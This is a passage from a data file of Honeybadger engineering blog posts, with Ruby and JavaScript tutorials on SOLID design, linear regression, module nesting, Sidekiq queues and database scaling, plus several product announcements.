breaking things and without the need to make a lot of changes. Interface Segregation Principle - ISP The interface segregation principle is applicable to static languages, and since Ruby is a dynamic language, there is no concept of interfaces. Interfaces define the abstraction rules between classes. The Principle states, Clients should not be forced to depend upon interfaces that they don't use. - Robert C. Martin What this means is that it is better to have many interfaces than a generalized interface that any class can use. If we define a generalized interface, the class has to depend on a definition that it does not use. Ruby does not have interfaces, but let us look at the class and subclass concept to build something similar. In the example used for the Liskov substitution principle, we saw that the subclass FullTimePayslipGenerator was inherited from the general class User. But User is a very generic class and could contain other methods. If we must have another functionality, such as Leave , it would have to be a subclass of User. Leave does not need to have a generate method, but it will be dependent on this method. So, instead of having a generic class, we can have a specific class for this: class Generator def generate raise \"NotImplemented\" end end class ContractorPayslipGenerator < Generator def generate # Code to generate payslip end end class FullTimePayslipGenerator < Generator def generate # Code to generate payslip end end This generator is specific to payslip generation, and the subclass does not need to depend on the generic User class. Dependency Inversion Principle - DIP Dependency inversion is a principle applied to decouple software modules. A high-level module should not depend on a low-level module; both should depend on abstraction. The design, using the above-described principles, guides us towards the dependency inversion principle. Any class that has a single responsibility needs things from other classes to work. To generate payroll, we need access to the database, and we need to write to a file once the report is generated. With the single responsibility principle, we are trying to have only one job for a single class. But, things like reading from the database and writing to a file need to be performed within the same class. It is important to remove these dependencies and decouple the main business logic. This will help the code to be fluid during change, and change becomes predictable. The dependency needs to be inverted, and the caller of the module should have control over the dependency. In our payslip generator, the dependency is the source of data for the report; this code should be organized in such a way that the caller can specify the source. Control of the dependency needs to be inverted and can be easily modified by the caller. In our example above, the ContractorPayslipGenerator module controls the dependency, as determining where to read the data and how to store the output is controlled by the class. To revert this, let us create a UserReader class that reads the user data: class UserReader def get raise \"NotImplemented\" end end Now, let us suppose we want this to read data from Postgres. We create a subclass of the UserReader for this purpose: class PostgresUserReader < UserReader def get # Code to read data from Postgres end end Similarly, we can have a reader from FileUserReader , InMemoryUserReader , or any other type of reader we want. We now need to modify the FullTimePayslipGenerator class so that it uses PostgresUserReader as a dependency. class FullTimePayslipGenerator < Generator def initialize ( datasource ) @datasource = datasource end def generate # Code to generate payslip data = datasource . get () end end The caller can now pass the PostgresUserReader as a dependency: datasource = PostgresUserReader . new () FullTimePayslipGenerator . new ( datasource ) The caller has control over the dependency and can easily change the source when needed. Inverting the dependency does not only apply to classes. We also need to invert the configurations. For example, while connecting the Postgres server, we need specific configurations, such as DBURL, username, and passwords. Instead of hardcoding these configurations in the class, we need to pass them down from the caller. class PostgresUserReader < UserReader def initialize ( config ) config = config end def get # initialize DB with the config self . config # Code to read data from Postgres end end Provide the config by the caller: config = { url: \"url\" , user: \"user\" } datasource = PostgresUserReader . new ( config ) FullTimePayslipGenerator . new ( datasource ) The caller now has complete control over the dependency, and change management is easy and less painful. Concluding SOLID design helps to decouple the code and make change less painful. It is important to design programs in such a way that they are decoupled, reusable, and responsive to change. All of the five SOLID principles complement each other and should co-exist. A well-designed codebase is flexible, easy to change, and fun to work with. Any new developer can jump in and easily understand the code. It is really important to understand what types of problems SOLID solves and why we are doing this. Understanding the problem helps you to embrace the design principles and design better software.", "date": "2021-03-15"},
{"website": "Honey-Badger", "title": "Breadcrumbs for JavaScript", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/javascript-breadcrumbs/", "abstract": "One of the things that makes fixing JavaScript errors so difficult is that everything happens on the client-side. When an obscure error happens in a callback, you often lack the context to reproduce it. If the error is critical, you may even resort to deploying debug code to get more information about the events leading up to it. We added a feature to help, and it's called Breadcrumbs. A Breadcrumb is a client-side event that happened before an error. Breadcrumbs are collected in realtime as users interact with your client-side application. When an error happens, the breadcrumbs leading up to it are included, filling in the missing context. Since launching breadcrumbs for Ruby and Elixir last year , our customers have been fixing errors faster and with more confidence. Today we're excited to announce that breadcrumbs are available for JavaScript! How Can You Use It? Breadcrumbs are available as of honeybadger-js version 2.1, but disabled by default. To capture breadcrumbs, you must explicitly enable them. We plan to enable breadcrumbs by default in version 3.0. To enable breadcrumbs in your project: Update your honeybadger-js package to the latest 2.x version (2.1.1 at the time of this post) Enable breadcrumbs in your honeybadger-js configuration: Honeybadger . configure ({ // ... breadcrumbsEnabled : true }); Automatic Breadcrumbs Honeybadger captures the following breadcrumbs automatically by instrumenting browser features: Clicks Console logs Errors History/location changes Network requests (XHR and fetch) Sending Custom Breadcrumbs No one knows your app better than you. In addition to the default events, you can report custom breadcrumbs to Honeybadger: Honeybadger . addBreadcrumb ( ' Loading User ' , { metadata : { user_name : userName } }); When an error is subsequently reported, you should see it in the Breadcrumb stack: You can also customize the category of custom events that are displayed. For\nmore information, check out the guide in the Honeybadger\ndocs . Let us know how it goes! We hope that Breadcrumbs will be a helpful addition your JavaScript toolbox. Try it out, and give us a shout if there is anything you would like to see added.", "date": "2020-02-06"},
{"website": "Honey-Badger", "title": "Predicting the Future With Linear Regression in Ruby", "author": ["Julie Kent"], "link": "https://www.honeybadger.io/blog/ruby-linear-regression/", "abstract": "Many choices that we make revolve around numerical relationships. We eat certain foods because science says they lower our cholesterol We further our education because we're likely to have an increased salary We buy a house in the neighborhood we believe is going to appreciate in value the most How do we come to these conclusions? Most likely, someone gathered a large amount of data and used it to form conclusions. One common technique is linear regression, which is a form of supervised learning. For more info on supervised learning and examples of what it is often used for, check out Part 1 of this series . Linear Relationships When two values — call them x and y — have a linear relationship, it means that changing x by 1 will always cause y to change by a fixed amount. It's easier to give examples: 10 pizzas cost 10x the price of one pizza. A 10-foot-tall wall needs twice as much paint as a 5-foot wall Mathematically, this kind of relationship is described using the equation of a line: y = mx + b Math can be dreadfully confusing, but oftentimes it seems like magic to me. When I first learned the equation of a line, I remember thinking how beautiful it was to be able to calculate distance, slope, and other points on a line with just one formula. But how do you get this formula, if all you have are data points? The answer is linear regression — a very popular machine learning tool. An Example of Linear Regression In this post, we are going to explore whether the beats per minute (BPM) in a song predicts its popularity on Spotify. Linear regression models the relationship between two variables. One is called the \"explanatory variable\" and the other is called the \"dependent variable.\" In our example, we want to see if BPM can \"explain\" popularity. So BPM will be our explanatory variable. That makes popularity the dependent variable. The model will utilize least-squares regression to find the best fitting line of the form, you guessed it, y = mx + b . While there can be multiple explanatory variables, for this example we'll be conducting simple linear regression where there is just one. Least-Squares What? There are several ways to do linear regression. One of them is called \"least-squares.\" It calculates the best fitting line by minimizing the sum of the squares of the vertical deviations from each data point to the line. I know that sounds confusing, but it's basically just saying, \"Build me a line that minimizes the amount of space between said line and the data points.\" The reason for the squaring and summing is so there aren't any cancellations between positive and negative values. Here is an image I found on Quora that does a pretty good job of explaining it. The Dataset we will be using this dataset from Kaggle: https://www.kaggle.com/leonardopena/top50spotify2019 You can download it as a CSV. The dataset has 16 columns; however, we only care about three — \"Track Name,\" \"Beats Per Minute,\" and \"Popularity.\" One of the most important steps of machine learning is getting your data properly formatted, often referred to as \"munging.\" You can delete all of the data except for the three aforementioned columns. Your CSV should look like this: Using Ruby to do the Regression In this example, we will be utilizing the ruby_linear_regression gem. To install, run: gem install ruby_linear_regression OK, we're ready to start coding! Create a new Ruby file and add these requires: require \"ruby_linear_regression\" require \"csv\" Next, we read our CSV data and call #shift , to discard the header row. Alternatively, you could just delete the first row from the CSV file. csv = CSV . read ( \"top50.csv\" ) csv . shift Let's create two empty arrays to hold our x-data points and y-data points. x_data = [] y_data = [] ...and we iterate using the .each method to add the Beats Per Minute data to our x array and Popularity data to our y array. If you're curious to see what is actually happening here, you can experiment by logging your row with either a puts or p . For example: puts row csv . each do | row | x_data . push ( [ row [ 1 ]. to_i ] ) y_data . push ( row [ 2 ]. to_i ) end Now it's time to use the ruby_linear_regression gem. We'll create a new instance of our regression model, load our data, and train our model: linear_regression = RubyLinearRegression . new linear_regression . load_training_data ( x_data , y_data ) linear_regression . train_normal_equation Next, we'll print the mean square error (MSE) — a measure of the difference between the observed values and the predicted values. The difference is squared so that negative and positive values do not cancel each other out. We want to minimize the MSE because we do not want the distance between our predicted and actual values to be large. puts \"Trained model with the following cost fit #{ linear_regression . compute_cost } \" Finally, let's have the computer use our model to make a prediction. Specifically, how popular will a song with 250 BPM be? Feel free to play around with different values in the prediction_data array. prediction_data = [ 250 ] predicted_popularity = linear_regression . predict ( prediction_data ) puts \"Predicted popularity: #{ predicted_popularity . round } \" Results Let's run the program in our console and see what we get! ➜  ~ ruby spotify_regression.rb\nTrained model with the following cost fit 9.504882197447587\nPredicted popularity: 91 Cool! Let's change the \"250\" to \"50\" and see what our model predicts. ➜  ~ ruby spotify_regression.rb\nTrained model with the following cost fit 9.504882197447587\nPredicted popularity: 86 It appears that songs with more beats per minute are more popular. Entire Program Here's what my entire file looks like: require 'csv' require 'ruby_linear_regression' x_data = [] y_data = [] csv = CSV . read ( \"top50.csv\" ) csv . shift # Load data from CSV file into two arrays -- one for independent variables X (x_data) and one for the dependent variable y (y_data) # Row[0] = title # Row[1] = BPM # Row[2] = Popularity csv . each do | row | x_data . push ( [ row [ 1 ]. to_i ] ) y_data . push ( row [ 2 ]. to_i ) end # Create regression model linear_regression = RubyLinearRegression . new # Load training data linear_regression . load_training_data ( x_data , y_data ) # Train the model using the normal equation linear_regression . train_normal_equation # Output the cost puts \"Trained model with the following cost fit #{ linear_regression . compute_cost } \" # Predict the popularity of a song with 250 BPM prediction_data = [ 250 ] predicted_popularity = linear_regression . predict ( prediction_data ) puts \"Predicted popularity: #{ predicted_popularity . round } \" Next Steps This is a very simple example, but nevertheless, you've just run your first linear regression, which is a key technique used for machine learning. If you're yearning for more, here are a few other things you could do next: \n- Check out the source code for the Ruby gem we were using to see the math happening under the hood \n- Go back to the original data set and try adding additional variables to the model and run a multi-variable linear regression to see if that can reduce our MSE. For example, maybe \"valence\" (how positive the song is) also plays a role in popularity. \n- Try out a gradient descent model, which can also be run using the ruby_linear_regression gem.", "date": "2020-04-15"},
{"website": "Honey-Badger", "title": "Uptime and API Monitoring Improvements", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/introducing-uptime-and-api-monitoring/", "abstract": "Here at Honeybadger we want to give you a complete picture of your application's\nhealth. That's why we include uptime & latency monitoring with all our plans. We've been hard at work making our uptime system even better; making it suitable\nnot only to check web pages, but also APIs. Many of our customers have found Honeybadger Uptime to be a great replacement for NewRelic's\nalerts, which were recently removed from their more affordable plans. Let's take a look at a few of our most interesting features: A Versatile Tool In their most basic form, uptime checks are simple. We request your website and see if it loads.\nBut they can be so much more. By providing request details like HTTP headers, payloads and timing, you can set up advanced uptime checks. For example\nyou can: POST a GraphQL query to your server and validate the response, once a minute Validate your site's SSL Certificate every five minutes POST a dummy SQL injection to ensure that your firewall rejects it with a 403 status code. GET a page with a custom HTTP header of Accept: application/pdf every fifteen minutes and ensure the status code is 201. A Global Network By default, we round-robin uptime checks from five regions: Virginia, Frankfurt, Singapore, London and Oregon.\nThis not only ensures that your site or API is reachable worldwide, but it also allows you to see how\nlatency affects users from different regions. If you prefer to limit uptime checks to a smaller number of regions, that's easy to configure. Alerts and Integrations Uptime checks use the same robust channels system that our exception notifications use.\nYou can route outage alerts to Email, SMS, Pagerduty, Slack -- you name it. The Dog That Didn't Bark If you have periodic tasks, like cron jobs or Heroku scheduled tasks,\nit's crucial to know if they stop running. These tasks don't have web endpoints,\nso we can't check them via Uptime checks. But you can use our new Check-Ins feature. Read more about Check-Ins here. Get started! If you already have a Honeybadger account, you can get started with Uptime and Check-ins\nvia the \"Uptime\" and \"Check-Ins\" tabs in your project. If you don't have an account,\nwhy don't you check us out ?", "date": "2017-11-21"},
{"website": "Honey-Badger", "title": "Announcing Honeybadger for Java", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/honeybadger-java/", "abstract": "We are very proud to announce that Honeybadger now officially supports reporting exceptions and errors -- with advanced features such as nested exceptions and request data! -- from Java web applications. Our new Java client makes it easy to get up and running quickly with a variety of frameworks and environments (with more on the way!). It's available to download via GitHub or from Maven Central . Once you have installed the package, setup consists of configuring a system property or environment variable with the API key of your Honeybadger project and then installing our global exception handler. For most modern web applications we provide a servlet-based implementation which supports configuration from web.xml as well as deeper integration with the Play web framework (Spring support is on the way!). Request data such as params and session data is sent to Honeybadger automatically, and you can configure sensitive keys to exclude. Speaking of configuration, we provide a lot of other settings and features out of the box: Nested exceptions are automatically included in error reports, making it easy to trace the exception back to its point of origin. Application traces are highlighted to easily locate the issue in your code rather than scanning through dependencies. Filter exceptions by class (to silence annoying and non-actionable errors). Proxy settings. Filters for sensitive request data and system properties. Custom error page with feedback form (this allows users who encounter exceptions while interacting with your web application to communicate with you through Honeybadger). Of course, we also provide a simple API for reporting exceptions which were caught manually. I hope that you will give Honeybadger a try on your next (or current!) Java project. We're dedicated to adding even more awesome features in the future, so monitoring Java applications with Honeybadger will only get better from here. Have a comment, question, or suggestion? Email me!", "date": "2015-09-17"},
{"website": "Honey-Badger", "title": "Let's build an RSS to email digest script with Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/lets-build-an-rss-to-email-digest-script-with-ruby/", "abstract": "I want something like this Setting up a newsletter has been on my todo list for way too long. Today is the day I'm going to make it happen. If you'd like to sign up you can do so here . I don't really like long-copy newsletters. The ones I do like are curated digests of interesting content. RubyWeekly comes do mind. So does Wistia's blog digest. Putting these digests together manually takes too much time. But going full-auto is too impersonal. So what I want is a semi-automated process. I need a script that will fetch our most recent blog posts and output an HTML email that I can personalize. So let's build it! It'll be a fun little project with only one user to make happy - me! The Game Plan Our script needs to do a few things: Fetch and parse the RSS feed for the Honeybadger blog Select the appropriate articles by category Render the collection of articles via an ERB template It'll be run from the command line and print its results to STDOUT. Fetching and Parsing Feeds in Ruby Did you know that Ruby's standard library ships with a module for producing and consuming RSS & ATOM feeds? For our use case it couldn't get much simpler. Here's how it works: require 'rss' feed = RSS :: Parser . parse ( 'https://www.honeybadger.io/blog/feed/' ) feed . items . each do | item | puts item . title end The module even fetches the feed for us. Talk about Service! Working with Categories I don't want to send subscribers links they're not interested in, so I'm going to filter articles by category. While Ruby's RSS library has a categories method, it returns an array of XML node objects. I need the category names, so I wrap the RSS items in a decorator class called Article . Now I can easily select only the articles in the category \"How To\". require 'rss' require 'delegate' class Article < SimpleDelegator def category_names categories . map & :content end end feed = RSS :: Parser . parse ( 'https://www.honeybadger.io/blog/feed/' ) articles = feed . items . map { | o | Article . new ( o ) }. select { | a | a . category_names . include? ( \"How To\" ) } Rendering the Template Since this is going to be an email without very much markup, I'm just going to use ERB for templating. As you can see below, I put the template and the rendering code together in a class called DigestView. For such a small, single-purpose template it seemed overkill to split it into a separate file. The final output is printed to STDOUT. This will let me pipe the output into OSXs pbcopy command, copying the output to the clipboard so I can paste it into our mail system. require 'rss' require 'delegate' require 'erb' class Article < SimpleDelegator def category_names categories . map & :content end end class DigestView attr_accessor :articles def initialize ( articles ) @articles = articles end def render ERB . new ( template , 0 , '>' ). result ( binding ) end def template %{<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\n<head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /></head>\n<body>\n<h1>Headline: Replace me</h1>\n<p>Intro paragraph: Replace me.</p>\n<ul>\n<% for article in @articles %>\n  <li>\n    <a href=\"<%= article.link %>\">\n  </li>\n<% end %>\n</ul>\n</body>\n</html>} end end feed = RSS :: Parser . parse ( 'https://www.honeybadger.io/blog/feed/' ) articles = feed . items . map { | o | Article . new ( o ) }. select { | a | a . category_names . include? ( \"How To\" ) } printf DigestView . new ( articles ). render This is what the output looks like: Output of our blog digest generator. Future Work I'll need to do a bit more before this is ready for production. But these are mostly customizations specific to Honeybadger, and which wouldn't be very useful otherwise. Here's my strike list for the rest of the day: Make the template pretty & test it with our email provider Add Google Analytics tracking parameters to the links Add post descriptions to the template", "date": "2015-06-24"},
{"website": "Honey-Badger", "title": "Objects as Ruby Hash Keys", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/objects-as-ruby-hash-keys/", "abstract": "If you've been following the Ruby 3x3 effort, you've probably heard of Optcarrot. It's an NES emulator written in pure Ruby. I was recently looking over the Optcarrot source and one interesting detail stuck out to me. It makes extensive use of a feature of Ruby's hashes that is often overlooked, but quite useful. That is the ability to use any object as a hash key. The context: NES Memory Mapping As high-level programmers, we tend to think of memory as RAM. But at a lower-level, \"memory\" has many other uses. Reading and writing to \"memory\" is how the NES's CPU communicates with the GPU, the control pads and any special electronics on the cartridge. Depending on the address used, a write_to_memory method call could reset the joystick, swap out VRAM or play a sound. How would you implement this in Ruby? Optcarrot does it by storing two Method objects for each of the 65536 addresses. One is a getter and one is a setter. It looks something like this: @getter_methods [ 0x0001 ] = @ram . method ( :[] ) @setter_methods [ 0x0001 ] = @ram . method ( :[]= ) The problem: Duplicate Objects The problem with using Object#method in this way is that it creates a lot of individual Method objects that are identical. We can see this by looking at object_id : > a = [] > a . method ( :[]= ). object_id => 70142391223600 > a . method ( :[]= ). object_id => 70142391912420 The two Method objects have different object_id values, so they're different objects even though they do the same thing. Normally, we might not care about a few extra Method objects, but in this case we're dealing with thousands of them. The solution: Memoizing via a Hash Optcarrot avoids the duplicate Method object problem with a trick that's so simple it's easy to overlook. It uses a hash to memoize and deduplicate. The simplified code below demonstrates the technique: def initialize @setter_methods = [] @setter_cache = {} ... end def add_setter ( address , setter ) # Doesn't store duplicates @setter_cache [ setter ] ||= setter # Use the deduped version @setter_methods [ address ] = @setter_cache [ setter ] end This works because Hash doesn't care what kind of objects you give it as keys. If this is confusing, try it in IRB with strings: > cache = {} > cache [ \"foo\" ] ||= \"bar\" => \"bar\" cache [ \"foo\" ] ||= \"baz\" => \"bar\" Now, consider that in Ruby, strings are instances of the class String . The mechanism Ruby used to use the string as a hash key is basically the same as the one used to store a Method object. How Hash calculates equality When using non-string objects as hash keys, the question arises: how does Hash know if two objects are equal? The answer is that it uses the Object#hash method. This method goes through your object and recursively generates a hash. It looks like this: > a . method ( :[]= ). hash => 929915641391564853 Because identical objects produce identical hash values it can be used as a test of equality. a . hash == b . hash Interesting enough, this is the same approach used by the eql? method: a . eql? ( b ) This works with the Method objects in our example: > a . method ( :[]= ). hash == a . method ( :[]= ). hash => true Conclusion Having gotten used to Ruby web development patterns, it was really interesting for me to look at the optcarrot source and see how a real-time non-web app uses different patterns. In a web app I doubt I'll ever make an array with 65536 elements, but here, as part of the setup for a \"desktop\" app, it makes a lot of sense. If you have any questions or comments, please be in touch at starr@honeybadger.io or @StarrHorne on Twitter.", "date": "2017-02-21"},
{"website": "Honey-Badger", "title": "Avoid these traps when nesting Ruby modules", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/avoid-these-traps-when-nesting-ruby-modules/", "abstract": "Modules (and classes) are meant to be nested.  Code fragments like ActiveRecord::RecordNotFound are so common that we don't think twice about them. But buried within Ruby's nesting implementation - and Rails' autoload system - are a few traps that can cause your code to fail in strange and wonderful ways. In this post, we'll discuss the origin of these traps and how you can avoid them. What is a constant? This post is about modules, but to understand those we need to understand constants. In most languages, constants are only used to store little bits of data, like in the example below: # These are simple constants MAX_RETRIES = 5 DEFAULT_LANGUAGE = \"en\" But in Ruby, classes and modules are also constants. I've written a little example to demonstrate this. There are three constants in the module below: a number, a class and a nested module. When you access a nested class or module, ruby finds it by using the same rules it would use with a simple numeric constant. module MyModule MY_FAVORITE_NUMBER = 7 # Classes are constants class MyClass end # So are modules module MyEmbeddedModule end end puts MyModule . constants . inspect # => [:MY_FAVORITE_NUMBER, :MyClass, :MyEmbeddedModule] Often, modules have access to the constants defined in their parents. That's why you can write code like this: module X MARCO = \"polo\" module Y def self . n puts MARCO end end end X :: Y . n () # => \"polo\" But you'd be wrong if you thought that this parent/child relationship was what allows Y to access X's constant MARCO. A common problem If we rewrite the code above in a slightly different way, something surprising happens. Y can no longer access X::MARCO. What the heck is going on here? module A MARCO = \"polo\" end module A::B def self . n puts MARCO # => uninitialized constant A::B::MARCO (NameError) end end A :: B . n () It turns out that the \"inheritance\" of a parent's constants by the child isn't due to the parent/child relationship. It's lexical. That means that it's based on the structure of your code, not on the structure of the objects your code is building. Inspecting nesting If you'd like to get a deeper understanding of how Ruby searches for nested constants, it's worth checking out the Module.nesting function. This function returns an array of objects that make up the \"search path\" for constants in a given scope. Let's examine the nesting for our previous examples. In our first example, we see that the nesting is [A::B, A] . This means that if we use the constant MARCO, Ruby will look for it first in A::B , and then in A . module A MARCO = \"polo\" module B def self . n puts Module . nesting . inspect # => [A::B, A] puts MARCO # => \"polo\" end end end In the second example, we see that the nesting only includes A::B , not A . Even though B is a \"child\" of A , the way I've written the code doesn't show them as nested, so for this purpose they might as well not be. module A MARCO = \"polo\" end module A::B def self . n puts Module . nesting . inspect # => [A::B] puts MARCO # => uninitialized constant A::B::MARCO (NameError) end end Rails autoload complications Have you ever noticed that you don't have to include files when you use Rails? If you want to use a model, you just use it. This is possible because Rails implements an autoload system. It uses Module.const_missing to detect when you try to reference a constant that hasn't been loaded. It then loads the files it believes should contain the constant. This works most of the time, but there's a catch. Rails assumes that a module always has the largest possible nesting. It assumes that module A::B::C will have a nesting of [A::B::C, A::B, A] . If it doesn't you'll get unexpected behavior. In the code below, module B shouldn't be able to access A::MARCO . In normal Ruby, it wouldn't be able to because its nesting is [A::B]. So you should get an exception. But Rails' autoload doesn't throw an exception. Instead, it returns A::MARCO . # a.rb module A MARCO = \"polo\" end # a/b.rb module A::B def self . n puts MARCO # => \"polo\" end end # some_controller.rb A :: B . n () Conclusion? All of this is a lot to think about. I prefer to avoid thinking where possible, so I try to stay away from the module A::B syntax. I can't think of a case where I would intentionally want to manipulate the module nesting. If you know of any, I'd love to hear about them!", "date": "2015-08-26"},
{"website": "Honey-Badger", "title": "Announcing Bitbucket Integration", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/bitbucket-integration/", "abstract": "Honeybadger has integrated tightly with GitHub since we started, allowing you to jump directly to the bug in your source code and automatically managing issues for errors. Today I'm happy to announce that we're bringing all the features our GitHub users know and love to Bitbucket -- because, let's face it: Bitbucket doesn't get enough love. Without further ado, here are some screenshots: Add the Bitbucket integration from your project settings page. Files are linked directly to Bitbucket from the backtrace. We hope that this new integration will make Honeybadger even more powerful for our Bitbucket users. If there's an integration you're still missing from Honeybadger, get in touch with me and let me know! (you can use the in-app help icon on your dashboard to send a quick message.)", "date": "2015-04-23"},
{"website": "Honey-Badger", "title": "Alerts and integrations just leveled up", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/alerts-and-integrations-just-leveled-up/", "abstract": "channels_screencast Since the beginning, you've been asking for: More integrations with tools like Jira, Sprintly and PagerDuty A richer and more granular system of alerts Well, my friends, today you have them. We've just shipped a completely re-written notification system. Not only does it work with more 3rd party tools, but it gives you an incredible amount of control over your alerts. New Integrations Honeybadger now works with the following tools: Github Issues Jira PagerDuty Asana Sprintly Pivotal tracker Flowdock Campfire Hipchat Internally, we’ve made it much easier for us to integrate with 3rd party tools, so expect to see more. Automatic error escalation Sometimes your app really breaks. It may only be throwing one error, but it's throwing it 10,000 times an hour. Wouldn't it be nice to be alerted of that? Now you can be. Here are a few examples: Get an extra email when your app has 100 errors / hour Get a text message when you hit 1000 errors / hour The rate is configurable by you. Keep everybody in the loop With the new system, you can set alerts for almost anything. The app is deployed An error happens (duh) An error is resolved or unresolved Someone comments on an error ...and more Flexible routing system In the past you could only get some alerts by email. Now all alerts are available on all the channels. For example, you can set up Honeybadger to: Post to campfire when your app is deployed Send you a text message when someone assigns an error to you Email you when an error is marked resolved Automatic ticket creation / sync You might use a tool like Github Issues to manage your team. Now you can have Honeybadger create issues automatically when errors come in. When you resolve an error, it can close the issue. And if the exception happens again, we can re-open the issue for you. Customizable per-user Possibly the best thing about these new features is that they can be customized on a per-user basis. If you’re a manager, you can set email alerts to tell you about Deploy events and high error rates. If you’re a developer, you can get all the alerts. Your whole team can keep an eye on the system, at the level that makes sense to them.", "date": "2013-08-30"},
{"website": "Honey-Badger", "title": "How to clear all Sidekiq queues, using the power of emoji", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/how-to-clear-all-sidekiq-queues-using-the-power-of-emoji/", "abstract": "Here at Honeybadger, we use Sidekiq a lot, and it's great. But there's one problem I've often run into. ...you see, I don't typically run Sidekiq when I'm in development. But in the course of manual testing, I cause lots of jobs to be enqueued. So the next time I do run Sidekiq it tries to process all of those jobs. Not good. It's easy to find code snippets that will delete the jobs from one Sidekiq queue. But we have lots of queues. I want to clear the jobs from all of them.  After a little digging, I came up with an answer that seems to work well. Behold! # I originally had a more verbose piece of code here but mperham, Sidekiq's creator, set me straight :) Sidekiq :: Queue . all . each ( & :clear ) There are more direct ways to go about it, but this one uses only methods defined in Sidekiq's public API, so hopefully it'll keep working even if the internals change. Now with more emoji! If you do a careful reading of the sidekiq source, you may notice you can use the 💣 emoji to invoke the clear method. No joke: # https://github.com/mperham/sidekiq/blob/master/lib/sidekiq/api.rb#L255 alias_method : 💣 , :clear So we can rewrite our \"clear all queues\" code like so: Sidekiq :: Stats . new . queues . each { | k , v | Sidekiq :: Queue . new ( k ) . 💣 } And since emoji's are so cool, we can make our own 💀 method to do the mass deletion. def 💀 Sidekiq :: Stats . new . queues . each { | queue_name , _ | Sidekiq :: Queue . new ( queue_name ) . 💣 } end", "date": "2015-07-28"},
{"website": "Honey-Badger", "title": "Simple tips to make scaling your database easier as you grow", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/easy-rails-database-scaling-wins/", "abstract": "When you're working on a young project you're constantly making decisions that will make it either easier or harder to scale later. Sometimes it's good to pick the short-term gain, to accrue a bit of technical debt so you can ship faster. But other times we pick up technical debt because we didn't know there was an alternative. I can say this because here at Honeybadger, we did a few things that made life much harder on us than it had to be. Had we understood a few key points scaling would have been much less painful. Use UUIDs When you say \"primary key\" most of us think of an auto-incrementing number. This works well for small systems, but it introduces a big problem as you scale. At any given moment only one database server can generate the primary key. That means all writes have to go through a single server. That's bad news if you want to do thousands of writes per second. Using UUIDs as primary keys sidesteps this problem. If you're not familiar with them, UUIDs are unique identifiers that look like this: 123e4567-e89b-12d3-a456-426655440000 . Here's how wikipedia describes them: When generated according to the standard methods, UUIDs are for practical purposes unique, without requiring a central registration authority or coordination between the parties generating them. The probability that a UUID will be duplicated is not zero, but is so close to zero as to be negligible. Thus, anyone can create a UUID and use it to identify something with near certainty that the identifier does not duplicate one that has already been created to identify something else, and will not be duplicated in the future. Information labeled with UUIDs by independent parties can therefore be later combined into a single database, or transmitted on the same channel, without needing to resolve conflicts between identifiers. When you use UUIDs as primary keys, all writes no longer have to go through a single database. Instead you can spread them out across many servers. In addition they give you the flexibility to do things like generate the id of a record before its saved to the database. This might be useful if you want to send the record to a cache or search server, but don't want to wait for the database transaction to complete. Enabling UUIDs by default in Rails apps is easy. Just edit the config file: # config/application.rb config . active_record . primary_key = :uuid You can use UUIDs for an individual table with Rails migrations: create_table :users , id: :uuid do | t | t . string :name end It's a simple configuration option that, if you enable it when you start development, will save you a world of trouble when you try to scale. As an extra bonus, it will make it harder for bots and bad actors to guess your private URLs. Counts and counters Once you start looking, counts and counters are everywhere. Your email client displays the number of unread emails. Blogs have a pagination footer that uses the total number of posts to calculate the number of pages. There are two scaling problems with counters: Database queries like select count(*) from users are inherently slow. They literally loop through each record in the recordset to generate their results. If you have a million records, it's going to take a while. Attempts to speed up counters by using \"counter caches\" do work, but they limit your ability to spread writes across many database servers. The easiest solution is to avoid using counters wherever possible. This is much easier when you're doing the initial design. For example, you might choose to page by date-range instead of by count. You might choose not to show a mildly-useful statistic that will be hellish to generate later. You get the idea. Expiring & warehousing data There is an upper limit to how much data you can store in a single postgres table given the amount of RAM, CPU and disk IO you have. That means there will come a point when you need to move stale data out of your main tables. Let's look at a simple case. You want to delete records more than a year old in a database that is a few gigabytes large. If you've never dealt with this issue before you might be tempted to do something like this: MyRecords . where ( \"created_at < ?\" , 1 . year . ago ). destroy The problem is that this query will take days or weeks to run. Your database is just too big. This is a particularly painful problem, because often you don't realize you have it until it's too late. Hardly anyone thinks about data purging strategies when their company is young and their database has 1,000 records. If you do manage to plan ahead, there is an easy solution. Just partition your tables. Instead of writing all of your data to my_records you write this week's data to my_records_1 and next week's data to my_records_2 . When it's time to delete last week's, just drop table my_records_1 . Unlike the delete, this query completes very quickly. It's possible to partition by fields other than date, too. Whatever makes sense for your use-case. There's even a postgres extension named pg_partman that takes care of all the details and allows you to partition your database without changing a line of your code. Or, if you prefer to have partitioning managed in Ruby, there's a handy gem called partitionable Parting Words Next time you find yourself building a project from scratch, I'd encourage you to take a few moments to think about scaling. Don't obsess over it. Don't spend days worrying about whether to use HAML or ERB. But do ask yourself if there aren't any easy wins that you can pick up simply by planning ahead.", "date": "2017-02-06"},
